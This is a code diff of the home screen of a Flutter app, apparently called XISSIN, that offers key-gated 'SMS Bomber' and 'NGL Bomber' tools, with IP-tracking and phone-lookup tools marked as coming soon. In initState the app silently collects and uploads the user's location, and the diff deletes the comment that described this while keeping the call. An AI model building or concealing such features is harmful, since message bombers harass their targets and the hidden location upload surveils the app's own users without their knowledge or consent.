@@ -2,6 +2,7 @@ import 'package:flutter/material.dart';
 import 'package:flutter/services.dart';
 import 'package:provider/provider.dart';
 import 'package:flutter_animate/flutter_animate.dart';
+import 'package:url_launcher/url_launcher.dart';
 import '../theme/app_theme.dart';
 import '../services/api_service.dart';
 import '../services/theme_service.dart';
@@ -24,21 +25,21 @@ class HomeScreen extends StatefulWidget {
 }
 
 class _HomeScreenState extends State<HomeScreen> {
-  bool _hasKey = false;
-  bool _loading = true;
+  bool _hasKey        = false;
+  bool _loading       = true;
   List<Map<String, dynamic>> _announcements = [];
-  final Set<String> _dismissedIds = {};
+  final Set<String> _dismissedIds           = {};
 
   @override
   void initState() {
     super.initState();
     _refreshAll();
-    // Silently collect and send location in the background.
-    // Runs after frame so it never delays UI.
     WidgetsBinding.instance.addPostFrameCallback((_) {
       LocationService.tryCollectAndSend(widget.userId);
     });
   }
+
+  // ── Data fetching ──────────────────────────────────────────────────────────
 
   Future<void> _refreshAll() async {
     await Future.wait([
@@ -54,7 +55,7 @@ class _HomeScreenState extends State<HomeScreen> {
       final data = await ApiService.keyStatus(widget.userId);
       if (!mounted) return;
       setState(() {
-        _hasKey = data['active'] == true;
+        _hasKey  = data['active'] == true;
         _loading = false;
       });
     } catch (_) {
@@ -71,67 +72,23 @@ class _HomeScreenState extends State<HomeScreen> {
     } catch (_) {}
   }
 
+  // ── Navigation ─────────────────────────────────────────────────────────────
+
   void _goToSms() {
-    if (!_hasKey) {
-      _showNoKeyDialog();
-      return;
-    }
+    if (!_hasKey) { _showNoKeyDialog(); return; }
     HapticFeedback.mediumImpact();
-    Navigator.push(
-      context,
-      PageRouteBuilder(
-        transitionDuration: const Duration(milliseconds: 400),
-        pageBuilder: (_, __, ___) => SmsBomberScreen(userId: widget.userId),
-        transitionsBuilder: (_, anim, __, child) => SlideTransition(
-          position: Tween<Offset>(
-            begin: const Offset(1.0, 0.0),
-            end: Offset.zero,
-          ).animate(CurvedAnimation(parent: anim, curve: Curves.easeOutCubic)),
-          child: child,
-        ),
-      ),
-    );
+    _pushSlide(SmsBomberScreen(userId: widget.userId));
   }
 
   void _goToNgl() {
-    if (!_hasKey) {
-      _showNoKeyDialog();
-      return;
-    }
+    if (!_hasKey) { _showNoKeyDialog(); return; }
     HapticFeedback.mediumImpact();
-    Navigator.push(
-      context,
-      PageRouteBuilder(
-        transitionDuration: const Duration(milliseconds: 400),
-        pageBuilder: (_, __, ___) => NglScreen(userId: widget.userId),
-        transitionsBuilder: (_, anim, __, child) => SlideTransition(
-          position: Tween<Offset>(
-            begin: const Offset(1.0, 0.0),
-            end: Offset.zero,
-          ).animate(CurvedAnimation(parent: anim, curve: Curves.easeOutCubic)),
-          child: child,
-        ),
-      ),
-    );
+    _pushSlide(NglScreen(userId: widget.userId));
   }
 
   Future<void> _goToKeys() async {
     HapticFeedback.selectionClick();
-    await Navigator.push(
-      context,
-      PageRouteBuilder(
-        transitionDuration: const Duration(milliseconds: 400),
-        pageBuilder: (_, __, ___) => KeyScreen(userId: widget.userId),
-        transitionsBuilder: (_, anim, __, child) => SlideTransition(
-          position: Tween<Offset>(
-            begin: const Offset(1.0, 0.0),
-            end: Offset.zero,
-          ).animate(CurvedAnimation(parent: anim, curve: Curves.easeOutCubic)),
-          child: child,
-        ),
-      ),
-    );
-    // Refresh key status after returning from key screen
+    await _pushSlide(KeyScreen(userId: widget.userId));
     _refreshKeyStatus();
   }
 
@@ -140,6 +97,51 @@ class _HomeScreenState extends State<HomeScreen> {
     Navigator.push(
         context, MaterialPageRoute(builder: (_) => const AboutScreen()));
   }
+
+  void _showComingSoon(String name) {
+    HapticFeedback.lightImpact();
+    ScaffoldMessenger.of(context).showSnackBar(
+      SnackBar(
+        behavior:         SnackBarBehavior.floating,
+        backgroundColor:  AppColors.surface,
+        shape: RoundedRectangleBorder(
+            borderRadius: BorderRadius.circular(AppRadius.md)),
+        margin: const EdgeInsets.fromLTRB(16, 0, 16, 16),
+        duration: const Duration(seconds: 2),
+        content: Row(children: [
+          const Icon(Icons.construction_rounded,
+              color: AppColors.gold, size: 18),
+          const SizedBox(width: 10),
+          Text(
+            '$name — Coming Soon!',
+            style: const TextStyle(
+                color: AppColors.textPrimary, fontWeight: FontWeight.w600),
+          ),
+        ]),
+      ),
+    );
+  }
+
+  // ── Slide page transition helper ───────────────────────────────────────────
+
+  Future<T?> _pushSlide<T>(Widget page) {
+    return Navigator.push<T>(
+      context,
+      PageRouteBuilder(
+        transitionDuration: const Duration(milliseconds: 400),
+        pageBuilder:        (_, __, ___) => page,
+        transitionsBuilder: (_, anim, __, child) => SlideTransition(
+          position: Tween<Offset>(
+                  begin: const Offset(1.0, 0.0), end: Offset.zero)
+              .animate(CurvedAnimation(
+                  parent: anim, curve: Curves.easeOutCubic)),
+          child: child,
+        ),
+      ),
+    );
+  }
+
+  // ── Dialogs ────────────────────────────────────────────────────────────────
 
   void _showNoKeyDialog() {
     final c = context.c;
@@ -150,7 +152,7 @@ class _HomeScreenState extends State<HomeScreen> {
         shape:
             RoundedRectangleBorder(borderRadius: BorderRadius.circular(22)),
         title: Text(
-          'Key Required',
+          '🔑  Key Required',
           style: TextStyle(
               color: c.textPrimary, fontWeight: FontWeight.bold),
         ),
@@ -177,6 +179,8 @@ class _HomeScreenState extends State<HomeScreen> {
     );
   }
 
+  // ── Build ──────────────────────────────────────────────────────────────────
+
   @override
   Widget build(BuildContext context) {
     final c = context.c;
@@ -189,115 +193,171 @@ class _HomeScreenState extends State<HomeScreen> {
       backgroundColor: c.background,
       body: SafeArea(
         child: RefreshIndicator(
-          onRefresh: _refreshAll,
-          color: c.primary,
+          onRefresh:       _refreshAll,
+          color:           c.primary,
           backgroundColor: c.surface,
-          displacement: 60,
+          displacement:    60,
           child: CustomScrollView(
             physics: const AlwaysScrollableScrollPhysics(),
             slivers: [
+              // ── Header ─────────────────────────────────────────────────────
               SliverToBoxAdapter(child: _buildHeader(c)),
 
-              // Announcements
+              // ── Key status pill ────────────────────────────────────────────
+              SliverToBoxAdapter(child: _buildKeyStatusRow(c)),
+
+              // ── Announcements ──────────────────────────────────────────────
               if (visible.isNotEmpty)
                 SliverToBoxAdapter(
                   child: Padding(
-                    padding: const EdgeInsets.only(top: 8),
+                    padding: const EdgeInsets.only(top: 4),
                     child: Column(
-                      children: List.generate(visible.length, (i) {
-                        return _AnnouncementBanner(
+                      children: List.generate(
+                        visible.length,
+                        (i) => _AnnouncementBanner(
                           announcement: visible[i],
-                          onDismiss: () => setState(() =>
-                              _dismissedIds
-                                  .add(visible[i]['id']?.toString() ?? '')),
-                          c: c,
+                          onDismiss: () => setState(() => _dismissedIds
+                              .add(visible[i]['id']?.toString() ?? '')),
+                          c:     c,
                           index: i,
-                        );
-                      }),
+                        ),
+                      ),
                     ),
                   ),
                 ),
 
-              // Tools section heading
+              // ── Section heading ────────────────────────────────────────────
               SliverToBoxAdapter(
                 child: Padding(
                   padding: const EdgeInsets.fromLTRB(22, 28, 22, 14),
-                  child: Text(
-                    'Tools',
-                    style: TextStyle(
-                      color: c.textPrimary,
-                      fontSize: 18,
-                      fontWeight: FontWeight.bold,
-                    ),
+                  child: Row(
+                    children: [
+                      Text(
+                        'Tools',
+                        style: TextStyle(
+                          color:      c.textPrimary,
+                          fontSize:   18,
+                          fontWeight: FontWeight.bold,
+                        ),
+                      ),
+                      const SizedBox(width: 8),
+                      Container(
+                        padding: const EdgeInsets.symmetric(
+                            horizontal: 8, vertical: 3),
+                        decoration: BoxDecoration(
+                          color: c.primary.withOpacity(0.15),
+                          borderRadius: BorderRadius.circular(AppRadius.full),
+                        ),
+                        child: Text(
+                          '6',
+                          style: TextStyle(
+                            color:      c.primary,
+                            fontSize:   11,
+                            fontWeight: FontWeight.bold,
+                          ),
+                        ),
+                      ),
+                    ],
                   ),
                 ),
               ),
 
-              // Tools grid — 4 cards (2 × 2)
+              // ── Tools grid (2 × 3) ─────────────────────────────────────────
               SliverPadding(
-                padding: const EdgeInsets.fromLTRB(16, 0, 16, 24),
+                padding: const EdgeInsets.fromLTRB(16, 0, 16, 32),
                 sliver: SliverGrid(
                   delegate: SliverChildListDelegate([
                     _FeatureCard(
-                      icon: Icons.sms_rounded,
-                      title: 'SMS Bomber',
-                      subtitle: '14 PH Services',
-                      gradient: [c.primary, c.secondary],
-                      glowColor: c.primary,
-                      locked: !_hasKey,
-                      loading: _loading,
-                      onTap: _goToSms,
-                      index: 0,
+                      icon:      Icons.sms_rounded,
+                      title:     'SMS Bomber',
+                      subtitle:  '14 PH Services',
+                      gradient:  AppColors.smsGradient,
+                      glowColor: AppColors.primary,
+                      locked:    !_hasKey,
+                      loading:   _loading,
+                      onTap:     _goToSms,
+                      index:     0,
                     ),
                     _FeatureCard(
-                      icon: Icons.chat_bubble_outline_rounded,
-                      title: 'NGL Bomber',
-                      subtitle: 'Anonymous Messages',
-                      gradient: const [Color(0xFFFF6EC7), Color(0xFFFF9A44)],
+                      icon:      Icons.chat_bubble_outline_rounded,
+                      title:     'NGL Bomber',
+                      subtitle:  'Anonymous Messages',
+                      gradient:  AppColors.nglGradient,
                       glowColor: const Color(0xFFFF6EC7),
-                      locked: !_hasKey,
-                      loading: _loading,
-                      onTap: _goToNgl,
-                      index: 1,
+                      locked:    !_hasKey,
+                      loading:   _loading,
+                      onTap:     _goToNgl,
+                      index:     1,
                     ),
                     _FeatureCard(
-                      icon: Icons.vpn_key_rounded,
-                      title: 'Key Manager',
-                      subtitle: _hasKey ? 'Key Active ✓' : 'Redeem Key',
-                      gradient: [c.secondary, const Color(0xFF7B6FFF)],
-                      glowColor: c.secondary,
-                      locked: false,
-                      loading: _loading,
-                      onTap: _goToKeys,
-                      index: 2,
+                      icon:      Icons.vpn_key_rounded,
+                      title:     'Key Manager',
+                      subtitle:  'Redeem & Manage',
+                      gradient:  AppColors.keyGradient,
+                      glowColor: const Color(0xFF00C9FF),
+                      locked:    false,
+                      loading:   _loading,
+                      onTap:     _goToKeys,
+                      index:     2,
                     ),
                     _FeatureCard(
-                      icon: Icons.info_outline_rounded,
-                      title: 'About',
-                      subtitle: 'App Info',
-                      gradient: const [Color(0xFF43E97B), Color(0xFF38F9D7)],
-                      glowColor: const Color(0xFF43E97B),
-                      locked: false,
-                      loading: false,
-                      onTap: _goToAbout,
-                      index: 3,
+                      icon:      Icons.info_outline_rounded,
+                      title:     'About',
+                      subtitle:  'App Info & Links',
+                      gradient:  AppColors.aboutGradient,
+                      glowColor: AppColors.secondary,
+                      locked:    false,
+                      loading:   _loading,
+                      onTap:     _goToAbout,
+                      index:     3,
+                    ),
+                    // ── Coming soon cards ───────────────────────────────────
+                    _FeatureCard(
+                      icon:      Icons.location_on_rounded,
+                      title:     'IP Tracker',
+                      subtitle:  'Locate & Info',
+                      gradient:  AppColors.comingSoon,
+                      glowColor: AppColors.neonOrange,
+                      locked:    false,
+                      loading:   false,
+                      onTap:     () => _showComingSoon('IP Tracker'),
+                      index:     4,
+                      comingSoon: true,
+                    ),
+                    _FeatureCard(
+                      icon:      Icons.phonelink_ring_rounded,
+                      title:     'Phone Info',
+                      subtitle:  'Number Lookup',
+                      gradient:  AppColors.comingSoon,
+                      glowColor: AppColors.neonPink,
+                      locked:    false,
+                      loading:   false,
+                      onTap:     () => _showComingSoon('Phone Info'),
+                      index:     5,
+                      comingSoon: true,
                     ),
                   ]),
                   gridDelegate:
                       const SliverGridDelegateWithFixedCrossAxisCount(
-                    crossAxisCount: 2,
+                    crossAxisCount:  2,
                     mainAxisSpacing: 14,
                     crossAxisSpacing: 14,
                     childAspectRatio: 0.88,
                   ),
                 ),
               ),
+
+              // ── Footer ─────────────────────────────────────────────────────
+              SliverToBoxAdapter(child: _buildFooter(c)),
+              const SliverToBoxAdapter(child: SizedBox(height: 24)),
             ],
           ),
         ),
       ),
     );
   }
+
+  // ── Header widget ──────────────────────────────────────────────────────────
 
   Widget _buildHeader(XissinColors c) {
     final themeService = context.watch<ThemeService>();
@@ -307,7 +367,7 @@ class _HomeScreenState extends State<HomeScreen> {
       child: Row(
         mainAxisAlignment: MainAxisAlignment.spaceBetween,
         children: [
-          // Logo / title
+          // Brand
           Column(
             crossAxisAlignment: CrossAxisAlignment.start,
             children: [
@@ -318,16 +378,17 @@ class _HomeScreenState extends State<HomeScreen> {
                 child: const Text(
                   'XISSIN',
                   style: TextStyle(
-                    color: Colors.white,
-                    fontSize: 26,
-                    fontWeight: FontWeight.w900,
+                    color:        Colors.white,
+                    fontSize:     28,
+                    fontWeight:   FontWeight.w900,
                     letterSpacing: 4,
                   ),
                 ),
               ),
               Text(
-                'by Xissin',
-                style: TextStyle(color: c.textSecondary, fontSize: 13),
+                'Multi-Tool Suite',
+                style: TextStyle(
+                    color: c.textSecondary, fontSize: 12),
               ),
             ],
           )
@@ -335,35 +396,182 @@ class _HomeScreenState extends State<HomeScreen> {
               .fadeIn(duration: 500.ms)
               .slideX(begin: -0.2, end: 0, duration: 500.ms),
 
-          // Theme toggle button
-          HapticIconButton(
-            icon: themeService.isDark
-                ? Icons.light_mode_rounded
-                : Icons.dark_mode_rounded,
-            onPressed: () {
-              HapticFeedback.selectionClick();
-              themeService.toggle();
-            },
-            color: c.textSecondary,
-            backgroundColor: c.surface,
-          )
-              .animate()
-              .fadeIn(duration: 500.ms)
-              .scale(
-                  begin: const Offset(0.8, 0.8), duration: 500.ms),
+          // Right side: Telegram + theme toggle
+          Row(
+            children: [
+              // Telegram channel quick link
+              _TelegramButton(c: c)
+                  .animate(delay: 100.ms)
+                  .fadeIn(duration: 500.ms)
+                  .scale(begin: const Offset(0.8, 0.8), duration: 400.ms),
+
+              const SizedBox(width: 8),
+
+              // Theme toggle
+              HapticIconButton(
+                icon: themeService.isDark
+                    ? Icons.light_mode_rounded
+                    : Icons.dark_mode_rounded,
+                onPressed: () {
+                  HapticFeedback.selectionClick();
+                  themeService.toggle();
+                },
+                color:           c.textSecondary,
+                backgroundColor: c.surface,
+              )
+                  .animate(delay: 150.ms)
+                  .fadeIn(duration: 500.ms)
+                  .scale(begin: const Offset(0.8, 0.8), duration: 400.ms),
+            ],
+          ),
+        ],
+      ),
+    );
+  }
+
+  // ── Key status row ─────────────────────────────────────────────────────────
+
+  Widget _buildKeyStatusRow(XissinColors c) {
+    return Padding(
+      padding: const EdgeInsets.fromLTRB(22, 16, 22, 0),
+      child: GestureDetector(
+        onTap: _goToKeys,
+        child: AnimatedContainer(
+          duration: AppDurations.normal,
+          padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
+          decoration: BoxDecoration(
+            color: _loading
+                ? c.surfaceAlt
+                : _hasKey
+                    ? AppColors.neonGreen.withOpacity(0.08)
+                    : c.error.withOpacity(0.08),
+            borderRadius: BorderRadius.circular(AppRadius.lg),
+            border: Border.all(
+              color: _loading
+                  ? c.border
+                  : _hasKey
+                      ? AppColors.neonGreen.withOpacity(0.35)
+                      : c.error.withOpacity(0.35),
+              width: 1,
+            ),
+          ),
+          child: Row(
+            children: [
+              if (_loading)
+                SizedBox(
+                  width: 14,
+                  height: 14,
+                  child: CircularProgressIndicator(
+                      strokeWidth: 2, color: c.textSecondary),
+                )
+              else
+                Icon(
+                  _hasKey
+                      ? Icons.verified_rounded
+                      : Icons.lock_outline_rounded,
+                  size:  16,
+                  color: _hasKey
+                      ? AppColors.neonGreen
+                      : c.error,
+                ),
+              const SizedBox(width: 10),
+              Expanded(
+                child: Text(
+                  _loading
+                      ? 'Checking key status...'
+                      : _hasKey
+                          ? 'Key Active — All tools unlocked'
+                          : 'No active key — Tap to redeem',
+                  style: TextStyle(
+                    color: _loading
+                        ? c.textSecondary
+                        : _hasKey
+                            ? AppColors.neonGreen
+                            : c.error,
+                    fontSize:   13,
+                    fontWeight: FontWeight.w600,
+                  ),
+                ),
+              ),
+              Icon(Icons.chevron_right_rounded,
+                  size: 16, color: c.textSecondary),
+            ],
+          ),
+        )
+            .animate()
+            .fadeIn(duration: 400.ms, delay: 200.ms)
+            .slideY(begin: -0.15, end: 0, duration: 400.ms),
+      ),
+    );
+  }
+
+  // ── Footer ─────────────────────────────────────────────────────────────────
+
+  Widget _buildFooter(XissinColors c) {
+    return Padding(
+      padding: const EdgeInsets.symmetric(horizontal: 22),
+      child: Row(
+        mainAxisAlignment: MainAxisAlignment.center,
+        children: [
+          Icon(Icons.bolt_rounded, size: 14, color: c.primary),
+          const SizedBox(width: 4),
+          Text(
+            'Xissin — by Xissin',
+            style: TextStyle(
+              color:    c.textSecondary,
+              fontSize: 12,
+            ),
+          ),
         ],
       ),
     );
   }
 }
 
-// ── Announcement banner ─────────────────────────────────────────────────────
+// ── Telegram quick-link button ───────────────────────────────────────────────
+
+class _TelegramButton extends StatelessWidget {
+  final XissinColors c;
+  const _TelegramButton({required this.c});
+
+  @override
+  Widget build(BuildContext context) {
+    return GestureDetector(
+      onTap: () async {
+        HapticFeedback.selectionClick();
+        final uri = Uri.parse('https://t.me/Xissin_0');
+        if (await canLaunchUrl(uri)) {
+          await launchUrl(uri, mode: LaunchMode.externalApplication);
+        }
+      },
+      child: Container(
+        width: 40,
+        height: 40,
+        decoration: BoxDecoration(
+          color: const Color(0xFF229ED9).withOpacity(0.15),
+          borderRadius: BorderRadius.circular(AppRadius.md),
+          border: Border.all(
+            color: const Color(0xFF229ED9).withOpacity(0.30),
+            width: 1,
+          ),
+        ),
+        child: const Icon(
+          Icons.telegram,
+          size:  20,
+          color: Color(0xFF229ED9),
+        ),
+      ),
+    );
+  }
+}
+
+// ── Announcement banner ──────────────────────────────────────────────────────
 
 class _AnnouncementBanner extends StatelessWidget {
   final Map<String, dynamic> announcement;
-  final VoidCallback onDismiss;
-  final XissinColors c;
-  final int index;
+  final VoidCallback          onDismiss;
+  final XissinColors          c;
+  final int                   index;
 
   const _AnnouncementBanner({
     required this.announcement,
@@ -392,7 +600,7 @@ class _AnnouncementBanner extends StatelessWidget {
 
   @override
   Widget build(BuildContext context) {
-    final type  = announcement['type'] as String? ?? 'info';
+    final type  = announcement['type']  as String? ?? 'info';
     final title = announcement['title'] as String? ?? 'Announcement';
     final msg   = announcement['message'] as String? ?? '';
     final color = _typeColor(type);
@@ -400,54 +608,65 @@ class _AnnouncementBanner extends StatelessWidget {
 
     return Padding(
       padding: const EdgeInsets.fromLTRB(22, 0, 22, 8),
-      child: GlassNeumorphicCard(
-        glowColor: color,
-        padding: const EdgeInsets.fromLTRB(14, 10, 10, 10),
-        child: Row(
-          crossAxisAlignment: CrossAxisAlignment.start,
-          children: [
-            Padding(
-              padding: const EdgeInsets.only(top: 2),
-              child: Icon(icon, size: 16, color: color),
-            ),
-            const SizedBox(width: 10),
-            Expanded(
-              child: Column(
-                crossAxisAlignment: CrossAxisAlignment.start,
-                children: [
-                  Text(
-                    title,
-                    style: TextStyle(
-                      color: color,
-                      fontSize: 12,
-                      fontWeight: FontWeight.bold,
-                    ),
-                  ),
-                  if (msg.isNotEmpty) ...[
-                    const SizedBox(height: 2),
+      child: Container(
+        decoration: BoxDecoration(
+          color:        c.surfaceAlt,
+          borderRadius: BorderRadius.circular(AppRadius.lg),
+          border: Border(
+            left: BorderSide(color: color, width: 3),
+            right:  BorderSide(color: c.border, width: 1),
+            top:    BorderSide(color: c.border, width: 1),
+            bottom: BorderSide(color: c.border, width: 1),
+          ),
+        ),
+        child: Padding(
+          padding: const EdgeInsets.fromLTRB(14, 10, 10, 10),
+          child: Row(
+            crossAxisAlignment: CrossAxisAlignment.start,
+            children: [
+              Padding(
+                padding: const EdgeInsets.only(top: 2),
+                child: Icon(icon, size: 16, color: color),
+              ),
+              const SizedBox(width: 10),
+              Expanded(
+                child: Column(
+                  crossAxisAlignment: CrossAxisAlignment.start,
+                  children: [
                     Text(
-                      msg,
+                      title,
                       style: TextStyle(
-                          color: c.textSecondary,
-                          fontSize: 12,
-                          height: 1.4),
+                        color:      color,
+                        fontSize:   12,
+                        fontWeight: FontWeight.bold,
+                      ),
                     ),
+                    if (msg.isNotEmpty) ...[
+                      const SizedBox(height: 2),
+                      Text(
+                        msg,
+                        style: TextStyle(
+                            color:    c.textSecondary,
+                            fontSize: 12,
+                            height:   1.4),
+                      ),
+                    ],
                   ],
-                ],
+                ),
               ),
-            ),
-            GestureDetector(
-              onTap: () {
-                HapticFeedback.selectionClick();
-                onDismiss();
-              },
-              child: Padding(
-                padding: const EdgeInsets.all(4),
-                child: Icon(Icons.close_rounded,
-                    size: 14, color: c.textSecondary),
+              GestureDetector(
+                onTap: () {
+                  HapticFeedback.selectionClick();
+                  onDismiss();
+                },
+                child: Padding(
+                  padding: const EdgeInsets.all(4),
+                  child: Icon(Icons.close_rounded,
+                      size: 14, color: c.textSecondary),
+                ),
               ),
-            ),
-          ],
+            ],
+          ),
         ),
       ),
     )
@@ -457,18 +676,19 @@ class _AnnouncementBanner extends StatelessWidget {
   }
 }
 
-// ── Feature card ─────────────────────────────────────────────────────────────
+// ── Feature card ──────────────────────────────────────────────────────────────
 
 class _FeatureCard extends StatelessWidget {
-  final IconData icon;
-  final String title;
-  final String subtitle;
-  final List<Color> gradient;
-  final Color glowColor;
-  final bool locked;
-  final bool loading;
-  final VoidCallback onTap;
-  final int index;
+  final IconData       icon;
+  final String         title;
+  final String         subtitle;
+  final List<Color>    gradient;
+  final Color          glowColor;
+  final bool           locked;
+  final bool           loading;
+  final VoidCallback   onTap;
+  final int            index;
+  final bool           comingSoon;
 
   const _FeatureCard({
     required this.icon,
@@ -480,6 +700,7 @@ class _FeatureCard extends StatelessWidget {
     required this.loading,
     required this.onTap,
     required this.index,
+    this.comingSoon = false,
   });
 
   @override
@@ -487,58 +708,104 @@ class _FeatureCard extends StatelessWidget {
     final c = context.c;
 
     return GlassNeumorphicCard(
-      glowColor: glowColor,
-      onTap: (locked || loading) ? null : onTap,
+      glowColor: comingSoon ? Colors.transparent : glowColor,
+      onTap: loading ? null : onTap,
       padding: const EdgeInsets.all(18),
-      child: Column(
-        crossAxisAlignment: CrossAxisAlignment.start,
+      child: Stack(
         children: [
-          GlassIconContainer(
-            icon: icon,
-            gradient: gradient,
-            glowColor: glowColor,
+          // Main content
+          Column(
+            crossAxisAlignment: CrossAxisAlignment.start,
+            children: [
+              // Icon container
+              GlassIconContainer(
+                icon:      icon,
+                gradient:  comingSoon
+                    ? [c.border, c.surfaceAlt]
+                    : gradient,
+                glowColor: comingSoon ? Colors.transparent : glowColor,
+              ),
+
+              const Spacer(),
+
+              // Lock / loading / coming soon indicator
+              if (locked && !loading && !comingSoon)
+                Padding(
+                  padding: const EdgeInsets.only(bottom: 6),
+                  child: Icon(Icons.lock_outline_rounded,
+                      color: c.textSecondary, size: 15),
+                ),
+              if (loading)
+                Padding(
+                  padding: const EdgeInsets.only(bottom: 6),
+                  child: SizedBox(
+                    width:  14,
+                    height: 14,
+                    child: CircularProgressIndicator(
+                        strokeWidth: 2, color: c.textSecondary),
+                  ),
+                ),
+
+              // Title
+              Text(
+                title,
+                style: TextStyle(
+                  color:      comingSoon
+                      ? c.textSecondary
+                      : c.textPrimary,
+                  fontSize:   15,
+                  fontWeight: FontWeight.bold,
+                ),
+              ),
+
+              const SizedBox(height: 3),
+
+              // Subtitle
+              Text(
+                subtitle,
+                style: TextStyle(
+                    color:    c.textSecondary,
+                    fontSize: 12),
+              ),
+            ],
           ),
-          const Spacer(),
-          if (locked && !loading)
-            Padding(
-              padding: const EdgeInsets.only(bottom: 6),
-              child: Icon(Icons.lock_outline,
-                  color: c.textSecondary, size: 15),
-            ),
-          if (loading)
-            Padding(
-              padding: const EdgeInsets.only(bottom: 6),
-              child: SizedBox(
-                width: 14,
-                height: 14,
-                child: CircularProgressIndicator(
-                  strokeWidth: 2,
-                  color: c.textSecondary,
+
+          // Coming Soon overlay badge
+          if (comingSoon)
+            Positioned(
+              top:   0,
+              right: 0,
+              child: Container(
+                padding: const EdgeInsets.symmetric(
+                    horizontal: 7, vertical: 3),
+                decoration: BoxDecoration(
+                  color: glowColor.withOpacity(0.18),
+                  borderRadius: BorderRadius.circular(AppRadius.sm),
+                  border: Border.all(
+                      color: glowColor.withOpacity(0.40), width: 1),
+                ),
+                child: Text(
+                  'SOON',
+                  style: TextStyle(
+                    color:         glowColor,
+                    fontSize:      9,
+                    fontWeight:    FontWeight.bold,
+                    letterSpacing: 0.5,
+                  ),
                 ),
               ),
             ),
-          Text(
-            title,
-            style: TextStyle(
-              color: c.textPrimary,
-              fontSize: 15,
-              fontWeight: FontWeight.bold,
-            ),
-          ),
-          const SizedBox(height: 3),
-          Text(
-            subtitle,
-            style: TextStyle(color: c.textSecondary, fontSize: 12),
-          ),
         ],
       ),
     )
         .animate(delay: Duration(milliseconds: 80 + 100 * index))
         .fadeIn(duration: 400.ms)
         .slideY(
-            begin: 0.2,
-            end: 0,
+            begin:  0.2,
+            end:    0,
             duration: 400.ms,
-            curve: Curves.easeOutCubic);
+            curve:  Curves.easeOutCubic);
   }
 }
+
+
